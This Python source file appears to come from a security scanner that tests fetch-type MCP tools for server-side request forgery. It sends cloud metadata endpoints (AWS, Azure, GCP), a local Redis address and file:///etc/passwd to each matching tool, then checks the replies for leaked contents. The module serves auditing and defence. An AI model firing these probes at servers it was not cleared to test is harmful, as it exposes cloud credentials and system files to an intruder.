# SPDX-License-Identifier: AGPL-3.0-or-later
"""SSRF probe targeting fetch-class MCP tools (MarkItDown, Fetch, etc.)."""

from __future__ import annotations

from dataclasses import dataclass

from ..client import McpClient
from ..content import is_tool_error, tool_result_text
from ..jsonrpc import JsonRpcCodec

_SENSITIVE_URLS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://127.0.0.1:6379/",  # local Redis
    "file:///etc/passwd",  # file scheme
]

_FETCH_TOOLS = ("fetch", "http", "url", "download", "convert", "markitdown")


@dataclass(frozen=True, slots=True)
class SsrfFinding:
    tool: str
    url: str
    status: str  # OK / DENIED / ERROR
    evidence: str = ""


def probe_ssrf(client: McpClient) -> list[SsrfFinding]:
    tools = client.list_tools()
    targets = [t for t in tools if any(k in t.name.lower() for k in _FETCH_TOOLS)]
    out: list[SsrfFinding] = []
    for tool in targets:
        for url in _SENSITIVE_URLS:
            req = JsonRpcCodec.request(
                "tools/call",
                {"name": tool.name, "arguments": {"url": url}},
                req_id=client.next_id(),
            )
            resp = client.transport.send(req)
            if resp.is_error:
                # Explicit denial is a meaningful signal: the parameter exists
                # and is being checked. Worth recording.
                out.append(
                    SsrfFinding(
                        tool=tool.name,
                        url=url,
                        status="DENIED",
                        evidence=str(resp.error)[:200],
                    )
                )
                continue
            text = tool_result_text(resp.result)
            if is_tool_error(resp.result):
                # The spec routes tool failures into a successful response with
                # isError set, not to the JSON-RPC error field, so a server that
                # refuses the fetch lands here rather than above. Without this the
                # refusal reads as an unremarkable success and is dropped, making a
                # properly guarded tool indistinguishable from a silent one.
                out.append(SsrfFinding(tool=tool.name, url=url, status="DENIED", evidence=text[:200]))
                continue
            if _ssrf_indicator(url, text):
                # Confirmed exfiltration of sensitive content.
                out.append(SsrfFinding(tool=tool.name, url=url, status="OK", evidence=text[:200]))
            # Silent successes without indicators are dropped — too noisy
            # to be useful in reports.
    return out


def _ssrf_indicator(url: str, body: str) -> bool:
    lower = body.lower()
    if "169.254.169.254" in url and ("ami-id" in lower or "instance-id" in lower):
        return True
    if "metadata.google" in url and "computemetadata" in lower:
        return True
    if "/etc/passwd" in url and "root:" in lower:
        return True
    return "127.0.0.1:6379" in url and ("redis" in lower or "noauth" in lower)
